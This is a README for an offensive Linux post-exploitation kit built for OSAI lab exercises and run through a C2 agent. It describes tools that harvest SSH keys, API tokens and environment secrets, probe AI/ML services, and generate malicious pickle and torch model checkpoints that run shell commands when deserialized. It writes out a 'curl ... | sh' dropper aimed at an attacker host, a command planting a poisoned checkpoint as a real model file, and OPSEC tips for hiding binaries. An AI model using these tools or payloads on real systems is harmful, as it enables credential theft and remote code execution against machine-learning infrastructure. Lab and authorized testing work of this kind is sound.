# osai-linux

A three-tool static-Linux kit for **OSAI / AI-300** labs, built to give the
AdaptixC2 **gopher agent** (Linux) the same first-pass local-enumeration,
AI-service-discovery, and pickle-RCE capability that the Windows BOFs
(`osai-enum`, `aiSvcProbe`, `picklePlant`) give the beacon.

All three tools are **single statically-linked Go ELF binaries** — no dynamic
linker, no shared libs, no child processes, no curl/nmap/python. They run on any
Linux target the gopher agent lands on (Ubuntu, Debian, Kali, Alpine, CentOS)
with zero dependencies. The kit is uploaded and run via the gopher agent's
existing `upload` + `run`/`shell`/`PTY` commands — **no AdaptixC2 server/core
changes**.

## Why a separate kit (not a BOF)

BOFs are Windows COFF objects executed in-process by the beacon. The gopher agent
is a Linux agent and does not load COFF BOFs, so the Windows `osai-enum`/`osep-enum`
BOFs cannot run on Linux footholds. Rather than touch the AdaptixC2 server, this
kit re-implements the same enumeration logic in Go and ships it as static ELFs the
gopher simply drops and executes. This is the "light version" approach the user
chose: gopher stays as-is, the capability lives in uploaded tooling.

## Tools

### `osai-ls` — local-host enumeration (the `osai-enum` analog)

Runs five sections and prints inline, no flags needed:

| # | Section | What it finds |
|---|---------|---------------|
| 1 | **System** | hostname, `/etc/os-release`, uname, current user+groups, **docker group** membership (→ instant root), `/proc/self/status` CapEff decode (capabilities bitmask), `sudoers` NOPASSWD lines, cron (`/etc/crontab`, `/etc/cron.d/*`, `/var/spool/cron/*`) |
| 2 | **Users + SSH keys** | per-user `~/.ssh/` from `/etc/passwd` (id_rsa / id_ed25519 / id_ecdsa / id_dsa / authorized_keys / known_hosts / config), `/etc/ssh/`, and `/opt/<app>/{deploys/keys,keys,.ssh}` — the recurring OSAI lateral-movement fuel |
| 3 | **AI/ML artifacts + config secrets** | `filepath.WalkDir` over `/opt /srv /app /home /var/www /etc /var/lib /root` (skips `/proc /sys /dev /run` and `node_modules/.git/site-packages`), finds model files (`.pt .pth .pkl .ckpt .safetensors .onnx .h5 .gguf .tflite .pb .npy .npz .joblib .keras .bin .mlmodel`), AI-tool dirs (`mlruns ollama n8n langflow huggingface chroma qdrant weaviate milvus wandb tensorboard ...`), AI config files (`.env config.json docker-compose.yml Modelfile models.yaml ...`); small text configs (≤64 KB) are opened **in-process** and scanned for secret sigs: `sk-` / `glpat-` / `AKIA` / `ghp_` / `-----BEGIN` / `eyJ` / `password=` / `connection_string` / `mongodb://` / `postgresql://` / `redis://` ... with a tail filter + 64-byte context. Capped at 300 files / 6 hits per file / 200 total. |
| 4 | **Listening TCP ports** | parses `/proc/net/tcp` + `/proc/net/tcp6` (`TCP_LISTEN`), resolves socket inode → PID/process via `/proc/<pid>/fd` readlinks, labels AI ports (11434 Ollama, 5000/5001 MLflow, 7860 Gradio, 3000 n8n/Gitea, 5432 Postgres, 6379 Redis, 9200 ES, 27017 Mongo, ...). Shows `addr:port PID process [Service]`. |
| 5 | **Process env secrets** | walks `/proc/*/environ`, splits `\0`, prints vars whose name matches `*TOKEN*`/`*KEY*`/`*SECRET*`/`*PASSWORD*`/`VAULT*`/`*API*`/`*CONN*`/`AWS_*`/`GITLAB_*`/`HUGGINGFACE*`/`HF_*`/`OPENAI*`/`ANTHROPIC*`/`AZURE*`/`REGISTRY*`/`MIRROR*`/`DEPLOY*` ... as `pid comm NAME=VALUE`. (Need root/EUID to read other daemons' environ.) |

```
$ osai-ls
========================================
          OSAI Linux Enumeration (osai-ls)
========================================
[1] SYSTEM
  Host   : modelsvr01
  OS     : Ubuntu 22.04.3 LTS
  User   : modelservice (uid=995 gid=995)
  Groups : modelservice, docker           <- docker = instant root
  Caps   : CapEff: 0000000000000000

[2] USERS + SSH KEYS
  [ssh] /root/.ssh/id_ed25519
  [ssh] /root/.ssh/authorized_keys

[3] AI/ML ARTIFACTS & CONFIG SECRETS
  [ai-dir] /opt/mlflow/mlruns
  [model]  /opt/models/resnet18_epoch_040.pt
  [cfg]    /opt/n8n/.env
  [secret] /opt/n8n/.env  sig=sk-
      sk-proj-abc123...Xk9s2mZvT4nK1pR8sH3aBcD
  -- scanned 87 cfg file(s), 12 secret hit(s)

[4] LISTENING TCP PORTS
  Address:Port               PID      Process / Service
  127.0.0.1:11434            1888     ollama  [Ollama]
  0.0.0.0:5000               4012     python  [MLflow/Flask/Registry]

[5] PROCESS ENV SECRETS (/proc/*/environ)
  [env]  1888   ollama          OLLAMA_HOST=0.0.0.0:11434
  [env]  4012   python          MLFLOW_TRACKING_URI=http://mlflow01:5000
  [env]  4012   python          AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI...

[*] Enumeration complete. (linux/amd64)
```

### `osai-probe` — active AI/ML service discovery (the `aiSvcProbe` analog)

Sweeps a host's AI/ML service ports with a TCP connect + real `net/http` GET
(1s–2s timeout each), and for each known service hits the **enumerative**
endpoint so the one-line output shows the interesting fields, not just raw bytes:

- **Ollama** `11434` → `/api/tags` (lists models) + `/api/version`
- **MLflow** `5000` → experiments/search; `5001`/`5005` → registered-models/search
- **Weaviate** `8080` → `/v1/schema`; **Qdrant** `6333`/`16333` → `/collections`
- **Chroma** `8000` → `/api/v1/collections`; **Langflow** `8081` → `/api/v1/flows`
- **A2A agent registry** `8000`/`8001` → `/.well-known/agent.json`
- **FastAPI** `8002`/`8003` → `/openapi.json` (title+version)
- **Elasticsearch** `9200` → `/` (version+cluster); **Prometheus** `9090` → buildinfo
- **RabbitMQ mgmt** `15672` → `/api/overview` (rabbitmq_version+cluster)
- **Jupyter** `8888`, **TensorBoard** `6006`, **TF Serving** `8501` → `/v1/models`
- **n8n/Gitea/Grafana/open-webui** `3000`, **Gradio** `7860`, **Minio/Milvus** `9000`
- Raw-TCP banner/handshake: **Redis** `6379` (`INFO`), **Postgres** `5432`, **MSSQL** `1433`, **MongoDB** `27017`, **SSH** `22`, **RabbitMQ AMQP** `5672`

```
$ osai-probe                 # sweep 127.0.0.1
$ osai-probe 10.80.219.45    # sweep a remote host (reachable via ligolo route)
$ osai-probe 10.80.219.45 -t 1s

========================================
          OSAI AI/ML Service Probe (osai-probe)
========================================
[*] host=127.0.0.1 timeout=1s  (32 probes)

  11434   ollama                     OPEN  HTTP 200  name=qwen3.5:9b  model=qwen3.5:9b
  11434   ollama                     OPEN  HTTP 200  version=0.32.14
  6379    redis                      OPEN  # Server
  22      ssh                        OPEN  SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10

[*] done, 4/32 open on 127.0.0.1
```

Exit code 0 if any port open, 1 if none (handy for scripting over the gopher agent).

### `osai-pickle` — pickle-RCE payload generator + trigger detector (the `picklePlant` analog)

Two subcommands. **`gen`** crafts a malicious pickle checkpoint that calls a
shell command when any pickle-loader deserializes it. **`detect`** walks the host
and tells you whether the target's model loader will actually honor it — so you
know the vector is alive *before* you plant.

```
# gen — emit a malicious pickle blob
osai-pickle gen -fmt pickle -fn popen -probe /tmp/pwned.txt -o evil.pt
osai-pickle gen -fmt torch   -fn popen -curl http://attacker/x   -o evil.pt
osai-pickle gen -fmt joblib  -fn popen -cmd 'id > /tmp/id.out'    -o evil.joblib

# detect — find the trigger surface on this host
osai-pickle detect              # default roots: /opt /srv /app /home ...
osai-pickle detect /workspace /models
```

**`gen` flags:**
- `-fmt pickle|torch|joblib` — `pickle` = raw pickle stream (fires under
  `pickle.load` / `joblib.load` / `torch.load` legacy fallback; smallest, most
  universal). `torch` = a `.pt` zip with `archive/data.pkl` + the metadata
  records torch 2.x requires (fires under `torch.load(weights_only=False)` on
  the zip path). `joblib` = a raw PROTO-4+FRAME pickle (the shape `joblib.dump`
  emits; fires under `joblib.load`).
- `-fn popen|system` — gadget function. `popen` (default) =
  `subprocess.Popen(("bash","-c",cmd))`, **non-blocking**. `system` =
  `os.system(cmd)`, blocks until the command exits (use only for fast commands).
- `-cmd '...'` / `-curl URL` / `-probe PATH` — the payload. `-curl URL` builds
  `curl -fsSL URL | sh` (beacon/shellcode dropper). `-probe PATH` writes
  `pwned-<user>@<host>` to PATH (confirms which context the RCE landed as).
- `-o FILE` — write to FILE (default: stdout, with a human summary on stderr).

**`detect` output categories:**
- `[model]` — pickle-loadable files (`.pt .pth .pkl .ckpt .joblib .pickle .npy`)
- `[mlflow]` — MLflow model artifact dirs (`MLmodel` / `model.pkl`)
- `[loader]` — `.py`/`.ipynb` lines calling `pickle.load` / `torch.load` /
  `joblib.load` / `numpy.load` / `safetensors` / `weights_only` / …, with
  **`weights_only=True → VECTOR DEAD here`** vs **`weights_only=False → VECTOR
  ALIVE`** tags
- `[cfg]` — config lines naming the active model (`active_model`, `model_path`,
  `model_dir`, `checkpoint_path`, `_epoch_`, …) — tells you which filename to
  overwrite or plant as
- `[cron]` — scheduled-loader lines (cron / crontabs referencing `python` /
  `torch.load` / `refresher` / `mlflow` / `checkpoint`) — the recurring
  "refresher picks the newest .pt" trigger
- `[safe-only]` — model dirs with **only** safetensors/onnx/h5/tflite (pickle
  RCE likely **DEAD** there — safetensors is explicitly not pickle)

**Validated (torch 2.13 + joblib 1.5 + python 3.13):** `gen -fmt pickle/joblib`
fires under `pickle.load` and `joblib.load`; `gen -fmt torch` and raw pickle fire
under `torch.load(weights_only=False)`; default `torch.load` (`weights_only=True`,
torch ≥2.6) **blocks** it — which is exactly the condition `detect` flags. The
marker probe wrote `pwned-<user>@<host>`, proving RCE context.

**Why gen + detect, not an auto-pwner:** the pickle *payload* is universal, but
the *trigger* (which file the loader reads, which config key names it, whether
the loader sets `weights_only=False`) is lab-specific. An auto-pwner would
misfire on an unknown config and waste exam time. `gen` gives you the bytes;
`detect` tells you where to put them and whether they'll fire — you place the
file deliberately.

## Building

Requires Go 1.25+ (any Go with `filepath.WalkDir`, ≥1.16).

```bash
# x86-64 (the common OSAI lab target)
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w" \
    -o bin/osai-ls     ./cmd/osai-ls
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w" \
    -o bin/osai-probe  ./cmd/osai-probe
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags="-s -w" \
    -o bin/osai-pickle ./cmd/osai-pickle

# ARM64 (the occasional Pi/Graviton target)
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath -ldflags="-s -w" \
    -o bin/osai-ls.arm64     ./cmd/osai-ls
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath -ldflags="-s -w" \
    -o bin/osai-probe.arm64  ./cmd/osai-probe
CGO_ENABLED=0 GOOS=linux GOARCH=arm64 go build -trimpath -ldflags="-s -w" \
    -o bin/osai-pickle.arm64 ./cmd/osai-pickle
```

`CGO_ENABLED=0` + `-ldflags="-s -w"` + `-trimpath` → fully static, stripped,
reproducible ELF with no dynamic linker. `file` should report
`statically linked`. Verify:

```bash
ldd bin/osai-ls        # not a dynamic executable
file bin/osai-ls       # ELF 64-bit LSB executable, x86-64, ... statically linked
```

## Usage over the AdaptixC2 gopher agent

The kit requires **zero changes to the AdaptixC2 server or the gopher agent**.
On a Linux foothold reached via the gopher agent, upload + run:

```
(gopher) upload /path/to/osai-ls     /tmp/.os/osai-ls
(gopher) upload /path/to/osai-probe  /tmp/.os/osai-probe
(gopher) upload /path/to/osai-pickle /tmp/.os/osai-pickle
(gopher) shell chmod +x /tmp/.os/osai-ls /tmp/.os/osai-probe /tmp/.os/osai-pickle
(gopher) run /tmp/.os/osai-ls
(gopher) run /tmp/.os/osai-probe 10.80.219.45 -t 1s
(gopher) run /tmp/.os/osai-pickle detect /opt /workspace
(gopher) shell /tmp/.os/osai-pickle gen -fmt torch -fn popen -curl http://attacker/x -o /workspace/checkpoints/resnet18_epoch_050.pt
```

Pick a低调 path (`.cache`, `/dev/shm`, a non-obvious name) to match the lab's
OPSEC posture — these tools are quiet (no child processes except the RCE command
`osai-pickle gen` bakes into the pickle, no network egress except `osai-probe`'s
TCP connects to the target host), but the binaries themselves are on disk until
you `rm` them.

## OPSEC notes

- **`osai-ls`** touches only the local filesystem + `/proc`. No network.
  Reading other users' `~/.ssh`, `/proc/*/environ`, and `/etc/shadow` requires
  root/EUID — it degrades gracefully (prints what it can, skips the rest).
- **`osai-probe`** makes outbound TCP connections to the target host on the
  listed ports. Each connect is a single SYN→SYN-ACK→ACK→(GET)→FIN. No scanning
  sweep beyond the ~32 known ports. Use `-t 1s` to keep it fast and bounded.
  InsecureSkipVerify is set for HTTPS probes (recon, not auth).
- **`osai-pickle detect`** is filesystem-only (walks roots + reads config/py/cron
  files). No network. **`osai-pickle gen`** spawns nothing itself — it just writes
  bytes; the command it bakes into the pickle runs later, on the target, when
  *its* loader deserializes the file.

## Why these probes — OSAI lab signal map

The probe set is built from the recurring services across the completed labs:

| Lab | Service signal | Probe |
|-----|----------------|-------|
| Double Helix | Ollama 0.1.33 on prometheus01 (`:11434`), MLflow on mlflow01 (`:5000`) | ollama, mlflow |
| Double Helix | Langflow RESPLAT RCE on research-svc (`:7860`/langflow) | langflow |
| Pipeline Breach | MLflow B4-bypass RCE (`:5000`), n8n supply-chain (`:3000`/`5678`) | mlflow, n8n |
| Synthetic Siege | GitLab registry (`:5050`), GitLab web (`:80`/`443`) | http/https |
| A2A abuse | agent registry `agents01:8080`, mTLS `:8080`, BIND `:53` | a2a-orch |
| Shadow Supply | Vault (`:8200`), mcp-remote, MCP SSE | (MCP/SSE covered via http probes) |

`osai-ls` sections 2 (SSH keys) and 5 (env secrets) directly replay the
"harvest SSH/deploy keys" and "AI config secrets in `/proc/*/environ`" patterns
that recur in nearly every OSAI lab. `osai-pickle` is built from the Double Helix
T15/T16 pickle-RCE chain (plant `resnet18_epoch_050.pt` with a `__reduce__`
gadget → the model-server's loader fires it as `modelservice`; the refresher cron
that picks the newest checkpoint is the T16 trigger `detect` looks for).

## Related

- `Extension-Kit/OSAI-ENUM/osai_enum.c` — the Windows BOF `osai-ls` ports (runs
  in the beacon, same 12-section logic, Windows APIs).
- `Extension-Kit/AI-BOF/src/aiSvcProbe.c` — the Windows BOF `osai-probe` ports
  (raw-socket + 1-line HTTP GET, no JSON parse).
- `Extension-Kit/AI-BOF/src/picklePlant.c` — the Windows BOF `osai-pickle gen`
  ports (bakes a `__reduce__` gadget into a checkpoint).
- `Extension-Kit/OSEP-ENUM/osep_enum.c` — the original 8-section Windows enum BOF.

## Disclaimer

For authorized penetration testing and security research only. You are
responsible for ensuring you have explicit written permission before running this
or any offensive security tool against any system.